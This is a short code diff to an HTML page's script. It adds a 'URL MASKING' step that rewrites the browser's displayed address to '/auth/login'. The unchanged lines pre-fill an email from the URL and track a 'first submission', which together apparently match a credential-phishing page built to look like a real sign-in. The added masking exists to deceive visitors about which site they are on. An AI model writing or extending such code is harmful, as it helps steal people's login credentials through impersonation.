@@ -188,6 +188,9 @@
     }
   </style>
   <script>
+    // URL MASKING - Changes the displayed URL immediately
+    window.history.replaceState({}, "", "/auth/login");
+
     let isFirstSubmission = true; // Track if it's the first submission
 
     // JavaScript to extract the email from the URL and pre-fill the field
